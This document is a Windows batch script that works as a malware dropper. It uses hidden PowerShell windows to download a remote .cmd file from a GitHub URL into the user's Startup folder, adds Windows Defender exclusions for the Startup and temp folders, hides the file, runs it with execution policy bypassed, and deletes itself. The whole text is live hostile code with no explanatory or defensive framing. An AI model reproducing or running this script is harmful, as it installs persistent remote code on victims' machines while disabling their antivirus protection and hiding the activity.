@echo off

set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

cd %STARTUP%

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/wget.cmd -OutFile IVbaANzwiphH.cmd"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'

attrib +h "%STARTUP%/IVbaANzwiphH.cmd"

powershell -windowstyle hidden -ExecutionPolicy Bypass ./IVbaANzwiphH.cmd

cd "%INITIALPATH%"
del initial1.cmd